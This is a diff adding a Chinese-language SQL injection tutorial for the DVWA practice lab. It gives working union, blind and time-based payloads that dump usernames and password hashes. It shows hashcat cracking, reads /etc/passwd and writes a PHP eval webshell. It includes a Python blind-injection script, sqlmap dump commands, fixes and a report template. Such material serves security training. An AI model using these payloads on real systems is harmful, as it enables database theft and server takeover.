+<p><strong>预期输出</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>First name: 8.0.12
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Surname: dvwa1
+</code></pre></div></p>
+<p><strong>常用信息查询函数</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>version()</code></td>
+<td>MySQL 版本</td>
+</tr>
+<tr>
+<td><code>database()</code></td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td><code>user()</code></td>
+<td>当前用户</td>
+</tr>
+<tr>
+<td><code>@@datadir</code></td>
+<td>数据库文件路径</td>
+</tr>
+<tr>
+<td><code>@@version_compile_os</code></td>
+<td>操作系统</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="24">2.4 获取所有数据库名<a class="headerlink" href="#24" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：查出 MySQL 里所有数据库</p>
+<p><strong>Payload</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>-1&#39; union select null,group_concat(schema_name) from information_schema.schemata-- -
+</code></pre></div></p>
+<p><strong>预期输出</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>information_schema,mysql,performance_schema,dvwa1,test
+</code></pre></div></p>
+<p><strong>关键点</strong>：
+- <code>information_schema</code> 是 MySQL 的系统库，存储所有数据库/表/列的元数据
+- <code>group_concat()</code> 把多行结果拼成一行，避免只显示第一条</p>
+<hr />
+<h3 id="25">2.5 获取指定数据库的表名<a class="headerlink" href="#25" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：查出 <code>dvwa1</code> 库里有哪些表</p>
+<p><strong>Payload</strong>（方法一，用单引号）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>-1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa1&#39;-- -
+</code></pre></div></p>
+<p><strong>Payload（方法二，用十六进制绕过字符集问题）</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>-1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=0x6476776131-- -
+</code></pre></div></p>
+<p><strong>十六进制转换</strong>：
+- 打开 Burp → Decoder
+- 输入 <code>dvwa1</code> → Encode as → Hex → 得到 <code>6476776131</code>
+- 加前缀 <code>0x</code> → <code>0x6476776131</code></p>
+<p><strong>预期输出</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>guestbook,users
+</code></pre></div></p>
+<p><strong>结论</strong>：目标表是 <code>users</code></p>
+<hr />
+<h3 id="26">2.6 获取指定表的列名<a class="headerlink" href="#26" title="Permanent link">&para;</a></h3>
+<p><strong>目标</strong>：查出 <code>users</code> 表有哪些字段</p>
+<p><strong>Payload</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>-1&#39; union select null,group_concat(column_name) from information_schema.columns where table_schema=0x6476776131 and table_name=0x7573657273-- -
+</code></pre></div></p>
+<p><strong>十六进制对照</strong>：
+- <code>dvwa1</code> → <code>0x6476776131</code>
+- <code>users</code> → <code>0x7573657273</code></p>
+<p><strong>预期输出</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,role
+</code></pre></div></p>
+<p><strong>重点字段</strong>：<code>user</code>（用户名）、<code>password</code>（密码哈希）</p>
+<hr />
+<h2 id="_3">阶段三：数据提取（脱库）<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="31">3.1 提取用户名和密码<a class="headerlink" href="#31" title="Permanent link">&para;</a></h3>
+<p><strong>Payload</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>-1&#39; union select null,group_concat(user,0x3a,password) from users-- -
+</code></pre></div></p>
+<p><strong>说明</strong>：
+- <code>0x3a</code> 是冒号 <code>:</code> 的十六进制，用来分隔用户名和密码
+- <code>group_concat()</code> 把所有用户拼成一行</p>
+<p><strong>预期输出</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>admin:5f4dcc3b5aa765d61d8327deb882cf99,gordonb:e99a18c428cb38d5f260853678922e03,1337:8d3533d75ae2c3966d7e0d4fcc69216b
+</code></pre></div></p>
+<hr />
+<h3 id="32">3.2 分行提取（清晰显示）<a class="headerlink" href="#32" title="Permanent link">&para;</a></h3>
+<p><strong>Payload</strong>（用 <code>&lt;br&gt;</code> 分隔）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>-1&#39; union select null,group_concat(user,0x3a,password separator &#39;&lt;br&gt;&#39;) from users-- -
+</code></pre></div></p>
+<p><strong>预期输出</strong>（HTML 渲染后）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>admin:5f4dcc3b5aa765d61d8327deb882cf99
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>gordonb:e99a18c428cb38d5f260853678922e03
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>1337:8d3533d75ae2c3966d7e0d4fcc69216b
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>smithy:5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre></div></p>
+<hr />
+<h3 id="33">3.3 破解密码哈希<a class="headerlink" href="#33" title="Permanent link">&para;</a></h3>
+<p><strong>识别哈希类型</strong>：32 位十六进制 → <strong>MD5</strong></p>
+<p><strong>在线破解</strong>：
+- <a href="https://www.cmd5.com/">CMD5</a>
+- <a href="https://crackstation.net/">CrackStation</a>
+- <a href="https://md5decrypt.net/">MD5 Decrypt</a></p>
+<p><strong>本地破解（Hashcat）</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># 保存哈希到文件</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># 使用字典破解（-m 0 表示 MD5）</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w"> </span>rockyou.txt
+</code></pre></div></p>
+<p><strong>破解结果</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>admin → password
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>gordonb → abc123
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>1337 → charley
+</code></pre></div></p>
+<hr />
+<h2 id="_4">阶段四：进阶技巧<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="41-load_file">4.1 读取文件（Load_file）<a class="headerlink" href="#41-load_file" title="Permanent link">&para;</a></h3>
+<p><strong>前提条件</strong>：
+- 当前用户有 <code>FILE</code> 权限
+- 知道文件绝对路径
+- <code>secure_file_priv</code> 未限制</p>
+<p><strong>Payload（读取 <code>/etc/passwd</code>）</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>-1&#39; union select null,load_file(&#39;/etc/passwd&#39;)-- -
+</code></pre></div></p>
+<p><strong>Windows 路径</strong>（双反斜杠或单斜杠）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>-1&#39; union select null,load_file(&#39;c:/windows/system.ini&#39;)-- -
+</code></pre></div></p>
+<hr />
+<h3 id="42-webshellinto-outfile">4.2 写入 Webshell（Into Outfile）<a class="headerlink" href="#42-webshellinto-outfile" title="Permanent link">&para;</a></h3>
+<p><strong>前提条件</strong>：
+- 有 <code>FILE</code> 权限
+- 知道 Web 根目录路径
+- <code>secure_file_priv</code> 允许写入</p>
+<p><strong>Payload（写入一句话木马）</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>-1&#39; union select null,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#39; into outfile &#39;c:/phpstudy/www/dvwa/shell.php&#39;-- -
+</code></pre></div></p>
+<p><strong>访问木马</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>http://127.0.0.1/dvwa/shell.php
+</code></pre></div></p>
+<p><strong>用 Webshell 管理工具连接</strong>（蚁剑/冰蝎/哥斯拉）：
+- URL: <code>http://127.0.0.1/dvwa/shell.php</code>
+- 密码: <code>cmd</code></p>
+<hr />
+<h3 id="43-waf">4.3 绕过 WAF 和过滤<a class="headerlink" href="#43-waf" title="Permanent link">&para;</a></h3>
+<h4 id="medium-mysqli_real_escape_string">Medium 级别（mysqli_real_escape_string 过滤）<a class="headerlink" href="#medium-mysqli_real_escape_string" title="Permanent link">&para;</a></h4>
+<p><strong>过滤规则</strong>：转义单引号 <code>'</code> → <code>\'</code></p>
+<p><strong>绕过方法</strong>：利用数字型注入点，或使用宽字节注入</p>
+<p><strong>DVWA Medium 特点</strong>：下拉框提交，抓包改参数
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Burp 抓包 → 改 id=1 为：
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>id=1 union select null,database()
+</code></pre></div></p>
+<hr />
+<h4 id="high-session">High 级别（弹窗输入 + Session 验证）<a class="headerlink" href="#high-session" title="Permanent link">&para;</a></h4>
+<p><strong>过滤规则</strong>：
+- 限制输入长度
+- 使用 <code>LIMIT 1</code> 限制返回行数</p>
+<p><strong>绕过方法</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>1&#39; union select null,database()#
+</code></pre></div></p>
+<p><strong>关键</strong>：用 <code>#</code> 注释掉后面的 <code>LIMIT 1</code></p>
+<hr />
+<h3 id="44">4.4 布尔盲注（无回显数据）<a class="headerlink" href="#44" title="Permanent link">&para;</a></h3>
+<p><strong>场景</strong>：页面只显示"成功"或"失败"，不显示具体数据</p>
+<p><strong>判断数据库名长度</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>1&#39; and length(database())=5-- -   → 成功
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>1&#39; and length(database())=6-- -   → 失败
+</code></pre></div></p>
+<p><strong>逐字符猜解数据库名</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>1&#39; and substr(database(),1,1)=&#39;d&#39;-- -   → 成功
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>1&#39; and substr(database(),2,1)=&#39;v&#39;-- -   → 成功
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>1&#39; and substr(database(),3,1)=&#39;w&#39;-- -   → 成功
+</code></pre></div></p>
+<p><strong>自动化脚本</strong>（Python）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/&quot;</span>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">:</span> <span class="s2">&quot;your_session_id&quot;</span><span class="p">,</span> <span class="s2">&quot;security&quot;</span><span class="p">:</span> <span class="s2">&quot;low&quot;</span><span class="p">}</span>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="n">db_name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span><span class="p">:</span>
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;1&#39; and substr(database(),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)=&#39;</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s2">&#39;-- -&quot;</span>
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;Submit&quot;</span><span class="p">:</span> <span class="s2">&quot;Submit&quot;</span><span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>        <span class="k">if</span> <span class="s2">&quot;exists&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>            <span class="n">db_name</span> <span class="o">+=</span> <span class="n">c</span>
+<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">db_name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>            <span class="k">break</span>
+<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a>        <span class="k">break</span>
+<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a>
+<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Database: </span><span class="si">{</span><span class="n">db_name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div></p>
+<hr />
+<h3 id="45">4.5 时间盲注（完全无回显）<a class="headerlink" href="#45" title="Permanent link">&para;</a></h3>
+<p><strong>场景</strong>：页面无论输入什么都返回相同内容</p>
+<p><strong>利用 <code>SLEEP()</code> 函数</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>1&#39; and if(length(database())=5, sleep(3), 0)-- -
+</code></pre></div></p>
+<p><strong>判断逻辑</strong>：
+- 如果条件为真，页面延迟 3 秒响应
+- 如果条件为假，立即响应</p>
+<p><strong>Burp Intruder 时间盲注</strong>：
+1. Payload 设置：<code>1' and if(substr(database(),§1§,1)='§a§', sleep(2), 0)-- -</code>
+2. 在 Columns 里添加 <code>Response received</code> 列
+3. 筛选响应时间 &gt; 2000ms 的请求
+4. 对应的字符就是正确的</p>
+<hr />
+<h2 id="sqlmap">阶段五：工具化测试（Sqlmap）<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h2>
+<h3 id="51">5.1 基础扫描<a class="headerlink" href="#51" title="Permanent link">&para;</a></h3>
+<p><strong>直接扫描 URL</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=your_session; security=low&quot;</span><span class="w"> </span>--dbs
+</code></pre></div></p>
+<p><strong>参数说明</strong>：
+- <code>-u</code>：目标 URL
+- <code>--cookie</code>：会话 Cookie（必须登录后才能访问 DVWA 页面）
+- <code>--dbs</code>：枚举所有数据库</p>
+<hr />
+<h3 id="52">5.2 指定数据库和表<a class="headerlink" href="#52" title="Permanent link">&para;</a></h3>
+<p><strong>枚举 dvwa1 的表</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=your_session; security=low&quot;</span><span class="w"> </span>-D<span class="w"> </span>dvwa1<span class="w"> </span>--tables
+</code></pre></div></p>
+<p><strong>枚举 users 表的列</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=your_session; security=low&quot;</span><span class="w"> </span>-D<span class="w"> </span>dvwa1<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
+</code></pre></div></p>
+<p><strong>脱取 user 和 password 字段</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=your_session; security=low&quot;</span><span class="w"> </span>-D<span class="w"> </span>dvwa1<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-C<span class="w"> </span>user,password<span class="w"> </span>--dump
+</code></pre></div></p>
+<hr />
+<h3 id="53-burp">5.3 从 Burp 导入请求<a class="headerlink" href="#53-burp" title="Permanent link">&para;</a></h3>
+<p><strong>步骤</strong>：
+1. Burp 抓包后，右键 → <strong>Copy to file</strong> → 保存为 <code>request.txt</code>
+2. 用 sqlmap 读取：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt<span class="w"> </span>--dbs
+</code></pre></div></p>
+<p><strong>优点</strong>：自动处理 POST 参数、Cookie、Header</p>
+<hr />
+<h3 id="54">5.4 高级选项<a class="headerlink" href="#54" title="Permanent link">&para;</a></h3>
+<p><strong>指定注入参数</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&amp;name=test&quot;</span><span class="w"> </span>-p<span class="w"> </span>id
+</code></pre></div></p>
+<p><strong>指定注入技术</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>BEUST
+</code></pre></div>
+- B: Boolean-based blind（布尔盲注）
+- E: Error-based（报错注入）
+- U: Union query（联合查询）
+- S: Stacked queries（堆叠查询）
+- T: Time-based blind（时间盲注）</p>
+<p><strong>绕过 WAF</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span>space2comment<span class="w"> </span>--random-agent
+</code></pre></div></p>
+<hr />
+<h2 id="_5">阶段六：防御与修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h3 id="61">6.1 漏洞成因<a class="headerlink" href="#61" title="Permanent link">&para;</a></h3>
+<p><strong>不安全的代码</strong>（PHP 示例）：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="x">$id = $_GET[&#39;id&#39;];</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="x">$query = &quot;SELECT * FROM users WHERE id = &#39;$id&#39;&quot;;</span>
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="x">$result = mysqli_query($conn, $query);</span>
+</code></pre></div></p>
+<p><strong>问题</strong>：用户输入 <code>$id</code> 直接拼接到 SQL 查询中，未做任何过滤。</p>
+<hr />
+<h3 id="62">6.2 防御方法<a class="headerlink" href="#62" title="Permanent link">&para;</a></h3>
+<h4 id="_6">方法一：预编译语句（最安全）<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="x">$id = $_GET[&#39;id&#39;];</span>
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="x">$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);</span>
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="x">$stmt-&gt;bind_param(&quot;i&quot;, $id);  // &quot;i&quot; 表示整数类型</span>
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="x">$stmt-&gt;execute();</span>
+<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="x">$result = $stmt-&gt;get_result();</span>
+</code></pre></div>
+<p><strong>原理</strong>：SQL 语句和参数分离，数据库先编译 SQL 结构，再填充参数，用户输入无法改变 SQL 逻辑。</p>
+<hr />
+<h4 id="_7">方法二：输入验证<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">$id = $_GET[&#39;id&#39;];</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="x">if (!is_numeric($id)) {</span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="x">    die(&quot;Invalid input&quot;);</span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="x">}</span>
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="x">$query = &quot;SELECT * FROM users WHERE id = $id&quot;;</span>
+</code></pre></div>
+<p><strong>适用场景</strong>：数字型参数</p>
+<hr />
+<h4 id="_8">方法三：转义特殊字符<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">$id = mysqli_real_escape_string($conn, $_GET[&#39;id&#39;]);</span>
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="x">$query = &quot;SELECT * FROM users WHERE id = &#39;$id&#39;&quot;;</span>
+</code></pre></div>
+<p><strong>局限性</strong>：在某些字符集下可以被绕过（宽字节注入）</p>
+<hr />
+<h3 id="63">6.3 最佳实践<a class="headerlink" href="#63" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>永远使用参数化查询</strong>（预编译）</li>
+<li><strong>最小权限原则</strong>：Web 应用连接数据库的用户不应有 <code>FILE</code>、<code>DROP</code>、<code>CREATE</code> 等高危权限</li>
+<li><strong>输入验证 + 白名单</strong>：数字参数用 <code>is_numeric()</code>，字符串参数用白名单匹配</li>
+<li><strong>错误信息不暴露</strong>：生产环境关闭数据库报错显示</li>
+<li><strong>WAF 防护</strong>：部署 ModSecurity 等 Web 应用防火墙</li>
+</ol>
+<hr />
+<h2 id="_9">阶段七：渗透测试报告模板<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<h3 id="71">7.1 漏洞标题<a class="headerlink" href="#71" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>SQL 注入漏洞 - DVWA 用户查询功能
+</code></pre></div>
+<hr />
+<h3 id="72">7.2 漏洞等级<a class="headerlink" href="#72" title="Permanent link">&para;</a></h3>
+<p><strong>高危</strong>（可直接获取数据库敏感数据）</p>
+<hr />
+<h3 id="73">7.3 漏洞描述<a class="headerlink" href="#73" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>目标系统的用户 ID 查询功能存在 SQL 注入漏洞，攻击者可通过构造恶意输入，
+<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>执行任意 SQL 查询，获取数据库中的敏感信息（用户名、密码哈希等）。
+</code></pre></div>
+<hr />
+<h3 id="74">7.4 漏洞位置<a class="headerlink" href="#74" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>URL: http://127.0.0.1/dvwa/vulnerabilities/sqli/
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>参数: id
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>请求方式: GET
+</code></pre></div>
+<hr />
+<h3 id="75">7.5 复现步骤<a class="headerlink" href="#75" title="Permanent link">&para;</a></h3>
+<p><strong>步骤一：判断注入点</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>输入: 1&#39;
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>响应: SQL 语法错误
+<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>结论: 存在字符型注入
+</code></pre></div></p>
+<p><strong>步骤二：判断列数</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Payload: 1&#39; order by 2-- -
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>响应: 正常
+<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>Payload: 1&#39; order by 3-- -
+<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>响应: Unknown column &#39;3&#39; in &#39;order clause&#39;
+<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>结论: 当前查询有 2 列
+</code></pre></div></p>
+<p><strong>步骤三：获取数据库信息</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Payload: -1&#39; union select version(),database()-- -
+<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>响应:
+<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>  First name: 8.0.12
+<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>  Surname: dvwa1
+</code></pre></div></p>
